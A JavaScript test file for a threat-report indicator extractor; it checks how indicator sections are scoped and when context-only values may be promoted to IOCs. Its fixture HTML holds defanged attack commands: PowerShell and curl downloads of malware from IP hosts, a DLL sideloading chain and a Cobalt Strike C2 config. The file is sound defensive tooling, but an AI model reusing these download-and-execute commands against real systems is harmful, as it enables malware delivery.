/**
 * Final-adjudication regressions (tl-section-tree-v7 / tl-candidates-v36).
 * Synthetic values only — no publisher, report or value condition.
 *
 * A. A section whose own lead-in paragraph declares that it adds / lists /
 *    contains indicators ("the following section adds new indicators …") is
 *    publisher indicator scope, read with delegated-authority semantics:
 *    download commands, operational C2 clauses, sample statements and C2
 *    configuration assert; passing mentions and legitimate binaries do not.
 *    Without the declaration, or when a narrative section only points at
 *    "indicators below", nothing changes.
 * B. promote_to_ioc never half-applies: a Context Only row that cannot become
 *    a report Indicator is refused before any write, with no IOC created. A
 *    MODE A narrative value the publisher did not describe as benign /
 *    provider / reference may be confirmed by an analyst (tl-candidates-v45);
 *    one the publisher called non-malicious context may not.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { extractCanonicalDocumentFromHtml } from './extract/extractHtml.js';
import { extractReportCandidates } from './extractionStages.js';
import { buildCandidateEvidenceRecord } from './evidencePolicy.js';
import { isReportIndicatorMember } from './indicatorMembership.js';
import { applyCandidateReviewActions } from './reviewService.js';
import { classifyPromoteEligibility } from './promotion.js';
import { THREAT_LIBRARY_CANDIDATE_EXTRACTION_VERSION } from './candidateExtraction.js';
import { SECTION_TREE_VERSION } from './sectionTree/version.js';

process.env.THREAT_LIBRARY_SCOPE_ENGINE = 'section_tree';

const SOURCE = 'https://vendor-research.example/blog/declared-indicator-appendix/';
const BEACON = 'ab12'.repeat(16);
const STAGER = 'cd34'.repeat(16);
const BATCH = 'ef56'.repeat(16);

function run(inner) {
  const html = `<!doctype html><html lang="en"><head><title>Threat Brief</title></head><body><article>
<h1>Threat Brief: exploitation campaign</h1>
<p>Background paragraph describing the exploitation activity across several environments.</p>
<h2>Indicators of Compromise</h2>
<table><thead><tr><th>Indicator</th><th>Data</th><th>Note</th></tr></thead><tbody>
<tr><td>IPv4 address</td><td>45.76.93[.]60</td><td>Reverse SSH SOCKS proxy C2</td></tr>
<tr><td>SHA256 hash</td><td>${BATCH}</td><td>Batch file downloaded from 91.215.85[.]14</td></tr>
</tbody></table>
${inner}
<h2>Tags</h2><p>exploitation</p>
</article></body></html>`;
  const r = extractCanonicalDocumentFromHtml(html, { url: SOURCE, finalUrl: SOURCE, httpStatus: 200 });
  assert.equal(r.ok, true);
  return extractReportCandidates({ source_type: 'url', source_url: SOURCE }, r.document);
}
const persisted = (c) => ({ ...c, has_original_document_occurrence: true, review_status: 'pending', evidence: buildCandidateEvidenceRecord(c) });
const members = (x) => x.candidates.filter((c) => isReportIndicatorMember(persisted(c))).map((c) => `${c.candidate_type}:${c.normalized_value}`).sort();

const APPENDIX_BODY = `
<p>In the first incident, an attacker used the following PowerShell command to download malware:</p>
<table><tbody><tr><td>1 2 3</td><td>powershell Invoke-WebRequest -Uri "hxxp[:]//45.67.89[.]21/download/2.jpg" -OutFile "cmake.exe"</td></tr></tbody></table>
<p>The downloaded file is a 64-bit Windows executable with a SHA256 hash of ${STAGER}.</p>
<p>Behavioral analysis of this file indicates it is a reverse HTTP stager. This malware calls to hxxps://45.67.89[.]21/_api/web over TCP port 443 with an Authentication header.</p>
<p>In the second incident, an attacker downloaded a batch file. The commands within the batch file are:</p>
<table><tbody><tr><td>1 2 3 4</td><td>@echo off curl -o "C:\\Users\\Public\\Pictures\\wbemcomn.dll" hxxp[:]//91.215.85[.]14/YGcF/wbemcomn.dll curl -o "C:\\Users\\Public\\Pictures\\cfg.ini" hxxp[:]//91.215.85[.]14/VAUZ/cfg.ini curl -o "C:\\Users\\Public\\Pictures\\svhost.exe" hxxp[:]//91.215.85[.]14/ryXQ/svhost.exe</td></tr></tbody></table>
<p>The three downloaded files are:</p>
<ul><li>svhost.exe</li><li>wbemcomn.dll</li><li>cfg.ini</li></ul>
<p>The svhost.exe file is a legitimate system file that will sideload the wbemcomn.dll file. This DLL file is meant to decrypt a Cobalt Strike beacon ${BEACON} from the downloaded .ini file.</p>
<table><tbody><tr><td>1 2 3</td><td>{'BeaconType': ['HTTPS'], 'Port': 12349, 'C2Server': 'data.cs-relay[.]top,/jquery-3.3.1.min.js', 'HttpPostUri': '/jquery-3.3.2.min.js'}</td></tr></tbody></table>
<p>A similar combination was also noted in another attack reported by a different vendor.</p>
<p>Updated May 23 to add Appendix section with additional indicators for threat hunting.</p>`;

const APPENDIX_VALUES = [
  'url:http://45.67.89.21/download/2.jpg',
  'url:https://45.67.89.21/_api/web',
  'url:http://91.215.85.14/YGcF/wbemcomn.dll',
  'url:http://91.215.85.14/VAUZ/cfg.ini',
  'url:http://91.215.85.14/ryXQ/svhost.exe',
  `sha256:${STAGER}`,
  `sha256:${BEACON}`,
  'domain:data.cs-relay.top'
];

test('contract versions', () => {
  assert.equal(THREAT_LIBRARY_CANDIDATE_EXTRACTION_VERSION, 'tl-candidates-v48');
  assert.equal(SECTION_TREE_VERSION, 'tl-section-tree-v11');
});

test('A. a section that declares it adds indicators is publisher indicator scope', () => {
  const x = run(`<h2>Appendix</h2>
<p>We further investigated the activity, and the following section adds new indicators from separate incidents that include follow-up malware payloads.</p>
<p>This information can be used for threat hunting.</p>${APPENDIX_BODY}`);
  const m = members(x);
  for (const v of APPENDIX_VALUES) assert.ok(m.includes(v), `${v} missing from ${m.join(', ')}`);
  // The formal IOC section is unchanged; the payload host is never inherited
  // from its URLs; the legitimate binary and file names stay out.
  assert.ok(m.includes('ip:45.76.93.60'));
  assert.ok(m.includes(`sha256:${BATCH}`));
  assert.equal(m.includes('ip:91.215.85.14'), false);
  assert.equal(m.some((v) => /svhost\.exe$|wbemcomn\.dll$|cmake\.exe$/.test(v) && !v.startsWith('url:')), false);
});

test('A. without the declaration the same appendix stays narrative under MODE A', () => {
  const x = run(`<h2>Appendix</h2>
<p>We further investigated the activity in two separate incidents that include follow-up malware payloads.</p>${APPENDIX_BODY}`);
  const m = members(x);
  for (const v of APPENDIX_VALUES.filter((v) => v !== 'url:http://45.67.89.21/download/2.jpg')) {
    assert.equal(m.includes(v), false, `${v} must not be a member without a declaration`);
  }
});

test('A. a narrative section pointing at "indicators below" opens nothing', () => {
  const x = run(`<h2>Conclusion</h2>
<p>Organizations should patch immediately. The indicators of compromise listed below can help defenders hunt for this activity; this section also references prior reporting on c2-history[.]top.</p>
<p>The actor previously used update-check[.]top for staging, as shown in Figure 3.</p>
<h2>Appendix A: List of Objects Checked</h2>
<p>The ransomware checks the following objects before encryption.</p>
<ul><li>wmic.exe</li><li>vssadmin.exe</li></ul>`);
  assert.deepEqual(members(x), ['ip:45.76.93.60', `sha256:${BATCH}`]);
});

// ---------------------------------------------------------- B. promote guard

const REPORT = { id: 9, public_id: 'rep-9', title: 'Brief', analysis_status: 'review_required', source_url: null };

function contextOnlyRow(overrides = {}) {
  return {
    id: 2,
    candidate_type: 'url',
    original_value: 'https://45.67.89.21/_api/web',
    normalized_value: 'https://45.67.89.21/_api/web',
    assessment: 'context_only',
    match_state: 'context_only',
    review_status: 'pending',
    role: 'reference',
    confidence: 0.7,
    is_ioc: true,
    source_assertion: 'body_mention',
    matched_ioc_id: null,
    evidence: {
      document_has_authoritative_scope: true,
      policy_decision: 'context_only_narrative_with_authoritative_scope',
      decision_source: 'deterministic',
      occurrences: [{ zone: 'report_body', occurrence_kind: 'narrative_mention', form: 'url', block_id: 'b1' }]
    },
    ...overrides
  };
}

function recordingPool(rows) {
  const writes = [];
  return {
    rows,
    writes,
    async query(sql, params = []) {
      if (/^\s*SELECT/i.test(sql)) {
        if (/FROM threat_reports/i.test(sql)) return { rows: [REPORT] };
        const ids = (params[1] || []).map(Number);
        return { rows: rows.filter((r) => ids.includes(Number(r.id))) };
      }
      writes.push(sql);
      return { rows: [], rowCount: 0 };
    }
  };
}

test('B. promote_to_ioc refuses a MODE A row the publisher called non-malicious context, before any write', async () => {
  for (const policy of [
    'context_only_provider_service',
    'context_only_reference_relation',
    'context_only_benign_component',
    'context_only_report_source',
    'context_only_rfc_example',
    'context_only_truncated_duplicate'
  ]) {
    const elig = classifyPromoteEligibility(contextOnlyRow({
      evidence: { ...contextOnlyRow().evidence, policy_decision: policy }
    }));
    assert.equal(elig.ok, false, policy);
    assert.equal(elig.code, 'promote_outside_publisher_scope', policy);
  }
  const row = contextOnlyRow({ evidence: { ...contextOnlyRow().evidence, policy_decision: 'context_only_reference_relation' } });
  const pool = recordingPool([row]);
  let created = 0;
  const res = await applyCandidateReviewActions(pool, 9, {
    action: 'promote_to_ioc',
    candidateIds: [2],
    createIoc: async () => { created += 1; return { status: 201, body: { id: 1 } }; },
    findExistingIoc: async () => null
  });
  assert.equal(res.ok, false);
  assert.equal(res.status, 409);
  assert.equal(res.code, 'promote_outside_publisher_scope');
  assert.equal(created, 0);
  assert.deepEqual(pool.writes, [], 'nothing is written');
  assert.equal(row.review_status, 'pending');
});

test('B. an analyst may confirm a MODE A narrative value that shows operational use (tl-candidates-v45)', () => {
  const narrative = contextOnlyRow({
    role: 'command_and_control',
    evidence: {
      document_has_authoritative_scope: true,
      policy_decision: 'context_only_narrative_with_authoritative_scope',
      source_relation: 'operational_malicious',
      occurrences: [{
        zone: 'report_body',
        occurrence_kind: 'narrative_assertion',
        form: 'url',
        source_relation: 'operational_malicious',
        surrounding_text: 'The malware calls to https://45.67.89.21/_api/web over TCP port 443 as its command and control endpoint.'
      }]
    }
  });
  const pending = classifyPromoteEligibility(narrative);
  assert.equal(pending.promotable, true);
  assert.equal(pending.requires_corroboration, true);
  assert.equal(pending.ok, false);
  assert.equal(pending.code, 'promote_corroboration_required');
  const confirmed = classifyPromoteEligibility(narrative, {
    corroboration: 'The narrative names this URL as the command and control endpoint.'
  });
  assert.equal(confirmed.ok, true);
  assert.equal(confirmed.basis, 'operational_evidence');
  // A neutral narrative mention, and a value with no original-document occurrence, are not confirmable.
  assert.equal(classifyPromoteEligibility(contextOnlyRow()).ok, false);
  assert.equal(classifyPromoteEligibility(contextOnlyRow()).code, 'promote_insufficient_evidence');
  assert.equal(classifyPromoteEligibility(contextOnlyRow({ has_original_document_occurrence: false })).ok, false);
});

test('B. promote_to_ioc follows positive evidence, not the absence of a negative stance', () => {
  // MODE B provider mention: lacking an authoritative IOC section is not permission.
  const provider = classifyPromoteEligibility(contextOnlyRow({
    evidence: { policy_decision: 'context_only_provider_service', decision_source: 'deterministic', occurrences: [{ zone: 'report_body', form: 'url' }] }
  }));
  assert.equal(provider.ok, false);
  assert.equal(provider.promotable, false);
  assert.equal(provider.blocked_class, 'provider_infrastructure');
  // An IOC-list row the extractor still called a provider, with no abuse of that value, stays blocked.
  const listedProvider = classifyPromoteEligibility(contextOnlyRow({
    source_assertion: 'explicit_ioc',
    evidence: {
      document_has_authoritative_scope: true,
      policy_decision: 'context_only_provider_service',
      occurrences: [{ zone: 'explicit_ioc_section', asserted: true, occurrence_kind: 'list_item', form: 'list_row' }]
    }
  }));
  assert.equal(listedProvider.ok, false);
  assert.equal(listedProvider.blocked_class, 'provider_infrastructure');
  // The same list row, asserted as infrastructure rather than as a provider, is promotable.
  const listed = classifyPromoteEligibility(contextOnlyRow({
    role: 'malicious_infrastructure',
    source_assertion: 'explicit_ioc',
    evidence: {
      document_has_authoritative_scope: true,
      policy_decision: 'explicit_report_assertion',
      source_relation: 'operational_malicious',
      occurrences: [{
        zone: 'explicit_ioc_section',
        asserted: true,
        occurrence_kind: 'list_item',
        form: 'list_row',
        structural_row: true,
        source_relation: 'operational_malicious',
        surrounding_text: 'https://45.67.89.21/_api/web'
      }]
    }
  }));
  assert.equal(listed.ok, true);
  assert.equal(listed.requires_corroboration, false);
  assert.equal(listed.basis, 'publisher_assertion');
});
